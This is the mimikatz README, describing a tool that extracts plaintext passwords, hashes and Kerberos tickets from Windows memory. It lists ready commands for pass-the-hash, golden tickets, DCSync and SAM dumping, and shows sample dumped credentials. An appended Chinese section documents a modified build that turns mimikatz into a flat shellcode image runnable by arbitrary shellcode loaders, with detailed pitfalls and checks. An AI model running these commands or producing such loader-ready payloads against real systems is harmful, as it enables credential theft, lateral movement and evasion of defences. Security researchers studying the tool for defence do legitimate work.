# mimikatz

**`mimikatz`** is a tool I've made to learn `C` and make somes experiments with Windows security.

It's now well known to extract plaintexts passwords, hash, PIN code and kerberos tickets from memory. **`mimikatz`** can also perform pass-the-hash, pass-the-ticket or build _Golden tickets_.

```
  .#####.   mimikatz 2.0 alpha (x86) release "Kiwi en C" (Apr  6 2014 22:02:03)
 .## ^ ##.
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   https://blog.gentilkiwi.com/mimikatz             (oe.eo)
  '#####'                                    with  13 modules * * */


mimikatz # privilege::debug
Privilege '20' OK
 
mimikatz # sekurlsa::logonpasswords
 
Authentication Id : 0 ; 515764 (00000000:0007deb4)
Session           : Interactive from 2
User Name         : Gentil Kiwi
Domain            : vm-w7-ult-x
SID               : S-1-5-21-1982681256-1210654043-1600862990-1000
        msv :
         [00000003] Primary
         * Username : Gentil Kiwi
         * Domain   : vm-w7-ult-x
         * LM       : d0e9aee149655a6075e4540af1f22d3b
         * NTLM     : cc36cf7a8514893efccd332446158b1a
         * SHA1     : a299912f3dc7cf0023aef8e4361abfc03e9a8c30
        tspkg :
         * Username : Gentil Kiwi
         * Domain   : vm-w7-ult-x
         * Password : waza1234/
...
```
But that's not all! `Crypto`, `Terminal Server`, `Events`, ... lots of informations in the GitHub Wiki https://github.com/gentilkiwi/mimikatz/wiki or on https://blog.gentilkiwi.com (in French, _yes_).

If you don't want to build it, binaries are availables on https://github.com/gentilkiwi/mimikatz/releases


## Quick usage
```
log
privilege::debug
```

### sekurlsa
```
sekurlsa::logonpasswords
sekurlsa::tickets /export

sekurlsa::pth /user:Administrateur /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd
```

### kerberos
```
kerberos::list /export
kerberos::ptt c:\chocolate.kirbi

kerberos::golden /admin:administrateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:chocolate.kirbi
```

### crypto
```
crypto::capi
crypto::cng

crypto::certificates /export
crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE

crypto::keys /export
crypto::keys /machine /export
```

### vault & lsadump
```
vault::cred
vault::list

token::elevate
vault::cred
vault::list
lsadump::sam
lsadump::secrets
lsadump::cache
token::revert

lsadump::dcsync /user:domain\krbtgt /domain:lab.local
```

## Build
`mimikatz` is in the form of a Visual Studio Solution and a WinDDK driver (optional for main operations), so prerequisites are:
* for `mimikatz` and `mimilib` : Visual Studio 2010, 2012 or 2013 for Desktop (**2013 Express for Desktop is free and supports x86 & x64** - http://www.microsoft.com/download/details.aspx?id=44914)
* _for `mimikatz driver`, `mimilove` (and `ddk2003` platform) : Windows Driver Kit **7.1** (WinDDK) - http://www.microsoft.com/download/details.aspx?id=11800_

`mimikatz` uses `SVN` for source control, but is now available with `GIT` too!
You can use any tools you want to sync, even incorporated `GIT` in Visual Studio 2013 =)

### Synchronize!
* GIT URL is  : https://github.com/gentilkiwi/mimikatz.git
* SVN URL is  : https://github.com/gentilkiwi/mimikatz/trunk
* ZIP file is : https://github.com/gentilkiwi/mimikatz/archive/master.zip

### Build the solution
* After opening the solution, `Build` / `Build Solution` (you can change architecture)
* `mimikatz` is now built and ready to be used! (`Win32` / `x64` even `ARM64` if you're lucky)
  * you can have error `MSB3073` about `_build_.cmd` and `mimidrv`, it's because the driver cannot be build without Windows Driver Kit **7.1** (WinDDK), but `mimikatz` and `mimilib` are OK.

### ddk2003
With this optional MSBuild platform, you can use the WinDDK build tools, and the default `msvcrt` runtime (smaller binaries, no dependencies)

For this optional platform, Windows Driver Kit **7.1** (WinDDK) - http://www.microsoft.com/download/details.aspx?id=11800 and Visual Studio **2010** are mandatory, even if you plan to use Visual Studio 2012 or 2013 after.

Follow instructions:
* https://blog.gentilkiwi.com/programmation/executables-runtime-defaut-systeme
* _https://blog.gentilkiwi.com/cryptographie/api-systemfunction-windows#winheader_

## Continuous Integration
`mimikatz` project is available on AppVeyor - https://ci.appveyor.com/project/gentilkiwi/mimikatz

Its status is: ![AppVeyor CI status](https://ci.appveyor.com/api/projects/status/github/gentilkiwi/mimikatz?svg=true&retina=true)

## Licence
CC BY 4.0 licence - https://creativecommons.org/licenses/by/4.0/

`mimikatz` needs coffee to be developed:
* PayPal: https://www.paypal.me/delpy/

## Author
* Benjamin DELPY `gentilkiwi`, you can contact me on Twitter ( @gentilkiwi ) or by mail ( benjamin [at] gentilkiwi.com )
* DCSync and DCShadow functions in `lsadump` module were co-writed with Vincent LE TOUX, you can contact him by mail ( vincent.letoux [at] gmail.com ) or visit his website ( http://www.mysmartlogon.com )

This is a **personal** development, please respect its philosophy and don't use it for bad things!

---

# MemLLVM 构建说明（本仓库修改部分）

本副本已接入 MemLLVM 编译链：所有 TU 经 MemLLVM pass 插件处理，产出**无 CRT、无导入表**的扁平 shellcode 镜像 `x64\mimikatz_mllvm.bin`，可被任意 shellcode 加载器（SCLoader / 等价实现）加载执行。

## 两种构建方式

```bat
:: 方式一：命令行一键构建（推荐，等价于 Clean+Rebuild）
D:\MemLLVM\examples\mimikatz\build\build_vs_release.bat
:: 产物：x64\mimikatz_mllvm.bin

:: 方式二：VS IDE 打开 mimikatz.sln，选 Release|x64，直接 Build
:: （配置来自 Directory.Build.props / Directory.Build.targets，与方式一完全相同）
```

关键配置文件：
| 文件 | 作用 |
|---|---|
| `Directory.Build.props` | LLVM 工具链路径（必须 22.1.8 与插件 ABI 匹配）、`EnableMemLLVM=true`、插件 flag |
| `Directory.Build.targets` | 强制 ClangCL 工具集、关 /GL、扁平链接配置、打包 target |
| `build/build_vs_release.bat` | MSBuild 命令行入口（显式传 SolutionDir） |
| `build/compile_all.bat` + `link_flat.bat` | 纯命令行构建链（不走 VS 工程系统） |

## 踩雷清单 ⚠️

以下每一条都是真实踩过、且单独一条就足以让产物「编译成功但一跑就崩」或「无声失败」的雷。

### A. VS 工程对接层

1. **`EnableMemLLVM` 被引用但从未定义** —— props 里所有插件 flag 挂在 `'$(EnableMemLLVM)'=='true'` 条件下，属性没定义则条件恒假：构建照常“成功”，但**一个文件都没过插件**，obj 里全是未重写的 `__imp_*` 导入。表现：bin 一调 API 就崩。修法：在 props 的 `PropertyGroup` 里显式 `<EnableMemLLVM>true</EnableMemLLVM>`。

2. **`PlatformToolset` 覆盖顺序** —— vcxproj 里无条件 `<PlatformToolset>v141</PlatformToolset>` 写在 ClangCL 条目**之后**（后写的赢），所以 props 里的 ClangCL 段从未生效。修法：放进 `Directory.Build.targets`（在 vcxproj 之后导入，能覆盖工程文件）。

3. **`/GL`（WholeProgramOptimization）完全绕过插件** —— pass 插件在编译期逐 TU 跑；`/GL` 把代码生成推迟到链接期，插件等于没跑。必须 `<WholeProgramOptimization>false</WholeProgramOptimization>`。

4. **`DelayLoadDLLs` 自动拖入 Delayimp.lib** —— 工程里 `DelayLoadDLLs=bcrypt.dll;ncrypt.dll` 会让 MSBuild 链接任务自动加 `Delayimp.lib`，它在 `/nodefaultlib` 下引用不存在的 `_load_config_used` 和 CFG 守卫表 → 链接报一堆未解析符号。修法：targets 里 `<DelayLoadDLLs></DelayLoadDLLs>` 清空（扁平镜像不需要延迟加载）。

5. **main / wmain 入口冲突** —— 插件在每个 TU 生成自己的 `main`（TU init 分发器 + 调 API 解析），与源码的 `wmain` 并存，不指定入口时 lld-link 报 `found both wmain and main`。修法：链接参数显式 `/entry:main`。

6. **工具集默认库静默漏入** —— `AdditionalDependencies` 结尾若带 `%(AdditionalDependencies)`，ClangCL 工具集会把 `kernel32.lib` 等系统导入库塞进来：任何漏改写的导入都会被**静默解析成导入表**，产出的 PE 抽成 bin 后一调 API 就崩。修法：结尾不带 `%(AdditionalDependencies)`，让漏网导入直接变成链接期硬错误。

7. **`$(SolutionDir)` 为空** —— 直接构建 vcxproj（不开 sln）时 `SolutionDir` 未定义，`IncludePath`/`OutDir` 里依赖它的路径全部失效（表现为 `globals.h` 找不到）。修法：构建脚本显式 `/p:SolutionDir=...`。

### B. 编译器 flag 层

8. **`/clang:-mno-stack-arg-probe` 是最隐蔽的雷** —— 它抑制 `__chkstk` 栈探测。mimikatz 的 `wmain` 有 `wchar_t input[0xffff]`（132KB 栈帧），没有栈探测时 `subq $0x20418` 一步跳过 guard page 落到**未提交内存**：一碰就死，而且**栈耗尽时连 VEH 都无法报告**（异常处理器自己也要栈），表现为无声崩溃、零输出、零日志。判据：用 `llvm-objdump -r <obj>` 查重定位表，旧 obj 有 `__chkstk`、坏 obj 没有。**严禁**在插件 flag 里保留这个选项。

9. **插件与宿主 clang 版本必须一致** —— `MemLLVM.dll` 用 LLVM 22.1.8 编译，VS 自带 clang-cl 是 22.1.3。插件与宿主 clang 无 ABI 稳定保证，版本不匹配表现为 "Plugin registered successfully" 后立刻 SIGSEGV（连 `int main(){}` 都崩）。修法：props 里 `LLVMInstallDir` 指向 22.1.8、`LLVMToolsVersion` 给主版本号。

10. **`-ffreestanding` 必须加** —— 不加时编译器认为运行在托管环境，`main` 里会多生成 `__local_stdio_printf_options`、`_doexit` 等 UCRT 调用，扁平镜像里没有对应实现。

11. **`-fcommon` 必须加** —— 上游源码大量在头文件里直接定义全局变量（`FILE * logfile;` 等 tentative definition），clang 11+ 默认 `-fno-common` 会让每个包含该头文件的 TU 产出强定义 → `lld-link` 报 duplicate symbol。

12. **`/GS-` 必须显式** —— 开了 `/GS` 会插 `__security_cookie`/`__report_gsfailure`，扁平镜像没有 CRT 启动来初始化 cookie，函数返回时栈检查直接崩。

### C. 构建流程层

13. **改编译器/配置后必须全量重编** —— 增量编译留下的陈旧 `.obj`（旧插件或无插件版本）会让跨 TU 的 `.mli` 槽位序错乱：`.mli` 槽排到哨兵之前永远扫不到，表现为命令表全 0、进程不崩但功能全废。VS 里等价操作是 Clean + Rebuild。排查手法：`llvm-objdump -h <obj> | grep mli`，一个裸 `.mli` 节都不能有。

14. **MSBuild 的代理变量陷阱** —— 父进程环境里 `HTTPS_PROXY` 与 `https_proxy` 大小写并存时，MSBuild 的 ToolTask 直接抛 `ArgumentException`。构建脚本里必须清空全部四种写法。

15. **MSBuild 实际下发的命令行要查 tlog** —— VS 构建日志（/v:m）看不到真实编译参数；设计时命令行（`*.dt.module.json.command`）是 IntelliSense 用的，**不是**真实编译命令。真命令在 `mimikatz\x64\mimikatz.tlog\clang-cl.command.1.tlog`（UTF-16LE）。

### D. 运行时 / 加载器层（为什么输出曾一片空白）

16. **双 CRT fd 表** —— SCLoader 用 VC-LTL 链接（fd 表在 `msvcrt.dll`），payload 的 `_write`/`_get_osfhandle` 解析到 `ucrtbase.dll`（另一张 fd 表）。加载器只 `_dup2` 自己那张表对 payload 无效：`printf`/`wprintf` 全部报成功但字节凭空消失，线程正常退出、退出码 0、输出空白。修法（SCLoader 侧）：对 `ucrtbase.dll` 再做一遍 `DuplicateHandle + _open_osfhandle + _dup2`（句柄必须复制，`_open_osfhandle` 接管所有权）。

17. **stdio 符号必须形成闭包** —— ltl 的 `FILE*` 是私有 16 字节结构。任何 stdio 函数（如 `fgetws`）没被 ltl 实现且被插件重写成动态解析时，宿主 UCRT 拿到 ltl 的 `FILE*` 按自己的布局解引用，立刻返回 NULL 或访问违例。已通过「前缀白名单 + ltl 补齐完整 stdio 闭包（含 `_nolock` 变体）」修复。

18. **ltl 的 stdio 无用户态缓冲** —— `printf` 直写句柄；`fflush` 只对 `FILE_TYPE_DISK` 调 `FlushFileBuffers`，对管道刷会阻塞到对端读空，与「先等线程结束再读管道」的加载器互等死锁。

## 排查工具箱

```bat
:: 查 obj 是否过了插件（应看到 MemLLVM_GetApiAddress / __memllvm_init_slot_*）
llvm-nm --defined-only mimikatz.obj | findstr MemLLVM

:: 查漏网导入（应为 0）
llvm-nm --undefined-only mimikatz.obj | findstr __imp_

:: 查 .mli 槽位节（不应有裸 .mli）
llvm-objdump -h mimikatz.exe | findstr mli

:: 查 MSBuild 真实编译命令
:: mimikatz\x64\mimikatz.tlog\clang-cl.command.1.tlog (UTF-16LE)

:: 加载验收（等价 SCLoader：管道 stdout + 空管道 stdin，带 VEH 崩溃定位）
build\sim_scloader.exe x64\mimikatz_mllvm.bin --timeout 8
```